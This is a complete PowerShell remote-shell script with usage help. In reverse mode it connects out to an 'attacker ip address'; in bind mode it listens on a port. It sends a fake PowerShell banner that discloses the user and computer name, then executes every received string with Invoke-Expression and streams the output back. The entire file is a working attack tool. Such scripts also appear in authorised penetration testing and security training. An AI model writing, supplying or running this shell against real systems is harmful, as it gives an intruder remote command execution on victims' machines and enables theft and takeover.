
    
    Param(
        [string]$ip,
        [int]$port,
        [string]$conType,
        [string]$help
    )
    
    try{
    
        if($help -eq 'show'){
        
            Write-Host ""
            Write-Host "Reverse/bind shell usage:"
            Write-Host "-connType:    Connection type can be <reverse> or <bind>"
            Write-Host "-port:        Specify the opened port according to connection type"
            Write-Host "-ip:          Specify attacker ip address" 
            Write-Host "For the reverse shell connection: ./shell.ps1 -port <port> -ip <ip address> -conType <connection type>"
            Write-Host "For the bind shell connection: ./shell.ps1 -port <port> -conType <connection type>"   
            
        }
  
        
        if($conType -eq 'bind'){
        
           $listen = [System.Net.Sockets.TcpListener]$port
           $listen.start()
           $socket = $listen.AcceptTcpClient()
        
        }
    
        if($conType -eq 'reverse'){
           
           $socket = New-Object System.Net.Sockets.TCPClient($ip,$port)
            
        }      
        
        $stream = $socket.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)
        
        
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        
            $eText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $eText.GetString($bytes,0, $i)
    
            try
            {
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            
            catch
            {
                Write-Warning "Command execution error!" 
                Write-Error $_
            }
            
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x
        
        
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        
        
        $socket.Close()
        
        if($listen){
        
            $listen.Stop()
        
        }
      
    }
      
    catch{
        
        Write-Warning "Cannot open socket. Control ip address, port and connection type." 
        Write-Error $_
    }
